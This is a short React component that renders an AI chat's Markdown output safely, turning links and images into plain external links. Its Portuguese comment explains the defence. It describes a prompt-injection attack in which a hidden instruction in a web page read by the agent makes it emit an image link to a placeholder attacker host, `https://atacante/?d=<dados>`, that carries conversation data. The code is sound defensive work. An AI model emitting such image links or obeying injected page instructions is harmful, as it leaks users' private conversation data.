import type { ReactNode } from 'react';
import ReactMarkdown from 'react-markdown';
import remarkGfm from 'remark-gfm';

/**
 * Renderiza Markdown sem HTML bruto: o conteúdo do LLM nunca vira HTML arbitrário.
 *
 * Imagens viram links. O navegador carrega uma imagem sozinho, sem clique, e isso
 * serviria para tirar dados da conversa: uma instrução escondida numa página lida
 * pelo agente pediria a resposta `![](https://atacante/?d=<dados>)`.
 */
export function Markdown({ children }: { children: string }) {
  return (
    <div className="prose-chat">
      <ReactMarkdown
        remarkPlugins={[remarkGfm]}
        components={{
          a: ({ href, children: linkText }) => <ExternalLink href={href}>{linkText}</ExternalLink>,
          img: ({ src, alt }) => <ExternalLink href={src}>{alt || src}</ExternalLink>,
        }}
      >
        {children}
      </ReactMarkdown>
    </div>
  );
}

function ExternalLink({ href, children }: { href?: string; children: ReactNode }) {
  return (
    <a href={href} target="_blank" rel="noreferrer noopener">
      {children}
    </a>
  );
}
